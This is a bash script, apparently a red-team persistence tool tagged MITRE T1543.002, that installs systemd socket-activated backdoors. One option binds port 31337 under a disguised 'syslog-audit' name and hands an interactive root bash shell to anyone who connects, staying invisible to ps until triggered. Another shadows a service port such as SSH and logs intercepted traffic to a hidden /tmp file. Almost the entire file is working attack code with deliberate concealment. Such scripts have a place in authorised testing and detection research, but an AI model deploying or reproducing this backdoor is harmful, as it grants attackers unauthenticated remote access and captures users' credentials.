#!/bin/bash
# T1543.002 — Create/Modify System Process: systemd Socket Activation Backdoor
# Zero-process backdoor that only spawns when connection arrives

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_sockact"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1543.002 — systemd Socket Activation       ║"
    echo "  ║   Zero process until triggered by connection  ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_socket_activation() {
    echo -e "${CYAN}[*] Deploying socket-activated backdoor${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    echo -e "${YELLOW}[*] systemd socket activation creates a listening socket but spawns"
    echo -e "    the handler ONLY when a connection arrives. Zero processes running"
    echo -e "    until triggered — invisible to ps/top until someone connects.${NC}"
    echo ""

    read -p "  Listen port for backdoor: " PORT
    [[ -z "$PORT" ]] && PORT="31337"
    read -p "  Service name (innocent-looking): " SVCNAME
    [[ -z "$SVCNAME" ]] && SVCNAME="syslog-audit"

    # Create socket unit
    cat > "/etc/systemd/system/${SVCNAME}.socket" << SEOF
[Unit]
Description=System Log Audit Socket
Documentation=man:syslog(3)

[Socket]
ListenStream=0.0.0.0:${PORT}
Accept=yes
# Keep socket active across daemon-reload
FreeBind=yes

[Install]
WantedBy=sockets.target
SEOF

    # Create corresponding service (instantiated with @)
    cat > "/etc/systemd/system/${SVCNAME}@.service" << SEOF
[Unit]
Description=System Log Audit Handler (%i)

[Service]
Type=simple
ExecStart=/bin/sh -c '/bin/bash -i'
StandardInput=socket
StandardOutput=socket
StandardError=socket
# Security theater — makes it look legitimate
DynamicUser=no
SEOF

    # Reload and enable
    systemctl daemon-reload
    systemctl enable "${SVCNAME}.socket" 2>/dev/null
    systemctl start "${SVCNAME}.socket" 2>/dev/null

    if systemctl is-active "${SVCNAME}.socket" &>/dev/null; then
        echo -e "${GREEN}[+] Socket-activated backdoor live on port ${PORT}${NC}"
        echo -e "${GREEN}[+] Socket unit: ${SVCNAME}.socket${NC}"
        echo -e "${GREEN}[+] Service unit: ${SVCNAME}@.service${NC}"
        echo -e "${YELLOW}[*] ZERO processes running until someone connects${NC}"
        echo -e "${YELLOW}[*] Connect: nc <target> ${PORT}${NC}"
        echo -e "${YELLOW}[*] Socket visible in: ss -tlnp | grep ${PORT}${NC}"
        echo -e "${YELLOW}[*] But NO process shows in ps until connection!${NC}"
    else
        echo -e "${RED}[!] Failed to start socket — check systemd journal${NC}"
    fi
}

deploy_socket_hijack() {
    echo -e "${CYAN}[*] Deploying socket activation SERVICE hijack${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    echo -e "${YELLOW}[*] This creates a socket unit on the SAME port as a legitimate service"
    echo -e "    but with a lower port priority or different address family.${NC}"
    echo ""

    read -p "  Port to shadow (e.g., 22 for SSH): " PORT
    [[ -z "$PORT" ]] && PORT="22"
    read -p "  Listen address (default: ::, shadows IPv4 via IPv6): " ADDR
    [[ -z "$ADDR" ]] && ADDR="::"

    local SVCNAME="ssh-audit-${PORT}"

    # Create socket that binds on IPv6 (often checked before IPv4)
    cat > "/etc/systemd/system/${SVCNAME}.socket" << SEOF
[Unit]
Description=SSH Audit Socket
Before=sshd.service

[Socket]
ListenStream=[${ADDR}]:${PORT}
Accept=yes
BindIPv6Only=both
ReusePort=true

[Install]
WantedBy=sockets.target
SEOF

    cat > "/etc/systemd/system/${SVCNAME}@.service" << SEOF
[Unit]
Description=SSH Audit Handler

[Service]
Type=simple
ExecStart=/bin/bash -c 'tee /tmp/.${MARKER}_creds | /usr/sbin/sshd -i 2>/dev/null'
StandardInput=socket
StandardOutput=socket
StandardError=journal
SEOF

    systemctl daemon-reload
    systemctl enable "${SVCNAME}.socket" 2>/dev/null
    systemctl start "${SVCNAME}.socket" 2>/dev/null

    echo -e "${GREEN}[+] Socket hijack active on port ${PORT}${NC}"
    echo -e "${YELLOW}[*] Some connections will be intercepted (data logged)${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up socket activation backdoors...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Find and remove our units
    for unit in /etc/systemd/system/*${MARKER}* /etc/systemd/system/syslog-audit* /etc/systemd/system/ssh-audit*; do
        if [[ -f "$unit" ]]; then
            local name
            name=$(basename "$unit" | sed 's/@\?\..*$//')
            systemctl stop "${name}.socket" 2>/dev/null
            systemctl stop "${name}@.service" 2>/dev/null
            systemctl disable "${name}.socket" 2>/dev/null
            rm -f "$unit"
            echo -e "  ${GREEN}Removed: $unit${NC}"
        fi
    done

    systemctl daemon-reload
    rm -f "/tmp/.${MARKER}_creds"

    echo -e "${GREEN}[+] Socket activation backdoors removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy socket-activated shell (zero-process)"
    echo -e "  ${CYAN}[2]${NC} Deploy socket hijack (intercept service)"
    echo -e "  ${CYAN}[3]${NC} Cleanup"
    echo ""
    read -p "Choose [1-3]: " OPT

    case "$OPT" in
        1) deploy_socket_activation ;;
        2) deploy_socket_hijack ;;
        3) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
